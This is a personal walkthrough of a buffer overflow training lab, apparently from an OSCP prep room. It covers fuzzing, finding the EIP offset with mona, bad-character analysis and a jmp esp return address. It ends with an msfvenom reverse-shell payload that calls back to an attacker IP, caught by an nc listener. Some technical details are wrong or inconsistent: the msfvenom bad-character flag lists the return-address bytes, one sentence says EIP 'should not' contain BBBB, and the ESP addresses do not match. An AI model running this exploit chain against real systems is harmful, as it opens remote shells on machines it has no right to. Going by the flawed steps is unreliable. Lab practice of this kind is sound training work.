Oscp buffer overflow prep part 9

I am adding a little bit info that might be useful here:

room intruct to connect to VM with xfreerdp /u:admin /p:password /cert:ignore /v:MACHINE_IP /workarea

but sometimes, when on network/VPN without proper TLS support it will refuse to connect.

quick fix : append this to your command ----> /tls-seclevel:+enforce-tlsv1_2

in my case, i use remmina, so go to edit the profil, go to Behavior tabs, put the above into "Execute command before connecting field. 





Set mona workingfolder : !mona config -set workingfolder c:\mona\%p

Also make sure that before running the above above mona cmd, you load oasp first. otherwise the folder name wont be based on it.

1. Fuzz the vulnerable server with fuzzer.py

python3 fuzzer.py      
Fuzzing with 100 bytes
Fuzzing with 200 bytes
Fuzzing with 300 bytes
Fuzzing with 400 bytes
Fuzzing with 500 bytes
Fuzzing with 600 bytes
Fuzzing with 700 bytes
Fuzzing with 800 bytes
Fuzzing with 900 bytes
Fuzzing with 1000 bytes
Fuzzing with 1100 bytes
Fuzzing with 1200 bytes
Fuzzing with 1300 bytes
Fuzzing with 1400 bytes
Fuzzing with 1500 bytes
Fuzzing with 1600 bytes
Fuzzing crashed at 1600 bytes

                              





2. Crash Again & Control EIP

Make exploit.py

Generate a cyclic pattern 400 bytes longer than the the one that crashed the server(1600) : 

/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2000 ; place the output to payload var of exploit.py

Run exploit.py 

Check EIP offset with mona Log data : !mona findmsp -distance 2000 -----> Log data

Log data, item 16
 Address=0BADF00D
 Message=    EIP contains normal pattern : 0x35794234 (offset 1514)



Update exploit.py and set the offset var to 1514. Set the payload var to an empty string. Set the retn var to "BBBB".
Rerun oscp again and run exploit.py, EIP should not contains BBBB : 42424242




3. Finding Bad Chars
Gernerate a bytearray using mona : !mona bytearray -b "\x00"

Generate string chars identical to bytearray usin bad_charsgen.py

Update exploit.py and set payload var to that generated string of chars

Restart oscp.exe in and run the modified exploit.py script again. Make a note of the address to which the ESP register points(019DFA30) and use it in the following mona command:

!mona compare -f C:\mona\oscp\bytearray.bin -a 01DCFA30 (Note that ESP change after modifying payload)

Make note badcahrs other than 00 : "\x04\x3e\x3f\xe1" // should go twice though


Generate a new bytearray in mona, specifying these new badchars along with \x00 : !mona bytearray -b "\x00\x04\x3e\x3f\xe1"

Then update the payload var in exploit.py and remove the new badchars as well.

Restart oscp.exe and run the modified exploit.py script again. Repeat the badchar comparison(new badchar : ) until the results status returns "Unmodified". This indicates that no more badchars exist. 






4. Finfing a Jump point 
!mona jmp -r esp -cpb "\x00\x04\x3e\x3f\xe1" (Use Log Data window to see result)

Log data, item 10
 Address=625011af set it in little endian for retn var in exploit4.py : "\xaf\x11\x50\x62"
 Message=  0x625011af : jmp esp |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\admin\Desktop\vulnerable-apps\oscp\essfunc.dll)






5. Generate Payload
msfvenom -p windows/shell_reverse_tcp LHOST=MY_IP LPORT=4444 EXITFUNC=thread -b "\xaf\x11\x50\x62" -f c

Copy the generated C code strings and integrate them into exploit.py payload var using the following notation: Add newline after every end of line

eg :

("\xfc\xbb\x89\x5d\x9b\x49\xeb\x0c\x5e\x56\x31\x1e\xad\x01"
"\xc3\x85\xc0\x75\xf7\xc3\xe8\xef\xff\xff\xff\x75\xb5\x19"
........
"\xb7\xb8\xe5\xb3\x7f\x51\x94\xac\x15\x55\x0b\xcc\x3f\x55"
"\xab\x32\xc0")




6. Prepend NOPs

Since an encoder was likely used to generate the payload, you will need some space in memory for the payload to unpack itself. You can do this by setting the padding variable to a string of 16 or more "No Operation" (\x90) bytes:

padding = "\x90" * 22


7. Exploit!


Start nc listener on port 4444 and run exploit.py
